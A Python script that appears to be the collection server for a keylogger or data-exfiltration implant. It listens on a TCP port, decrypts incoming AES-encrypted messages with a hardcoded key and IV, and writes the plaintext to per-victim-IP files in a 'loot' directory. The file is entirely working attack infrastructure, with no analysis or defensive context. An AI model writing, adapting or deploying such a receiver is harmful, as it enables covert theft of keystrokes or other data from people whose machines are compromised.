#!/usr/bin/python3

import socket
import threading
import time
import os
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

SECRET_KEY = b'w\xd7\xc9=0\x17\xd1{\xe3\xc7{\x1a"\x8d\xa7\xb19\x87e\xb7gTQ\x98R\xed\xf2\x90\xbc\xfb2\xd2'
IV = b'\xed>\x86\x98\xed\xe5%\x99\x91\xe9r\x8b\t\xe3\xf2\xd2'

HOST = '0.0.0.0'
PORT = 43558
LOOT_DIR = 'loot'
WRITE_INTERVAL = 10

buffers = {}
lock = threading.Lock()
stop_event = threading.Event()

def timestamp():
    return datetime.now().strftime('%Y-%m-%d %H:%M:%S')

def decrypt_data(encrypted_data):
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, IV)
    decrypted_data = cipher.decrypt(base64.b64decode(encrypted_data))
    return unpad(decrypted_data, AES.block_size).decode()

def periodic_writer():
    while not stop_event.is_set():
        time.sleep(WRITE_INTERVAL)
        with lock:
            for ip, buf in buffers.items():
                if buf:
                    filename = os.path.join(LOOT_DIR, f"{ip}.txt")
                    with open(filename, 'a', encoding='utf-8') as f:
                        f.write(''.join(buf))
                    buf.clear()

def main():
    if not os.path.exists(LOOT_DIR):
        os.makedirs(LOOT_DIR)

    writer_thread = threading.Thread(target=periodic_writer, daemon=True)
    writer_thread.start()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen()

        print(f'[*] {timestamp()} : Listening on {HOST}:{PORT}')

        try:
            while True:
                conn, addr = s.accept()
                ip = addr[0]
                print(f'[+] {timestamp()} : Connection from {addr}')

                with conn:
                    while True:
                        data = conn.recv(4096)
                        if not data:
                            break

                        try:
                            decrypted_text = decrypt_data(data)
                            with lock:
                                if ip not in buffers:
                                    buffers[ip] = []
                                buffers[ip].append(decrypted_text)
                        except Exception as e:
                            print(f'[!] {timestamp()} : Decryption error: {e}')

        except KeyboardInterrupt:
            print(f"\n[!] {timestamp()} : Shutting down server...")
            stop_event.set()
            writer_thread.join()

            # Flush remaining buffers
            with lock:
                for ip, buf in buffers.items():
                    if buf:
                        filename = os.path.join(LOOT_DIR, f"{ip}.txt")
                        with open(filename, 'a', encoding='utf-8') as f:
                            f.write(''.join(buf))

if __name__ == '__main__':
    main()
